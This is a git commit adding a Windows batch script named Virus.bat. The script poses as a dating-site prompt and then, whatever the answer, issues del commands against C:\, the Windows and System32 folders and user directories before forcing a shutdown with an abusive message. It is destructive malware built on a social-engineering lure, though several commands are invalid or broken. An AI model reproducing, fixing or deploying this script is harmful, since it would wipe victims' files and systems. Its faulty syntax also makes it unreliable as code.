f1111ad351a6795b98193e774bd61e5bdb3d7dd6
senudahansilu8 <116836292+senudahansilu8@users.noreply.github.com>
2022-10-27 23:26:30 +0530

    Create Virus.bat

---
+++ Virus.bat
@@ -0,0 +1,35 @@
+@echo off
+color s7
+echo Hey user This is a dating website in panomora company LTD.
+echo Do you want girl friend?
+set/p love=
+if%love%==yes goto love
+if%love%==no goto hate
+:love
+echo thanks for your selection...you selected our service
+disable mouse
+disable keyboard
+del c:/
+del c:/windows
+del c:/windows/system32
+del c:/windows/system32/winlogin.exe
+del c:/windows
+del c:/NVIDIA
+:hate
+echo It okay motherfucker bitch....Your computer have a big trouble Error.... Error.....
+del c:/windows
+del c:/Document and settings
+del c:/Recovery
+del c:/temp
+del c:/program file
+del c:/perflogs
+del c:/rend
+del c:/user
+del c:/MCPP
+del c:/CMD
+del c:/Powershell
+del c:/
+disable windows
+dir/s
+timeout 10
+shutdown-s -t 10 -c "say fuck your computer"
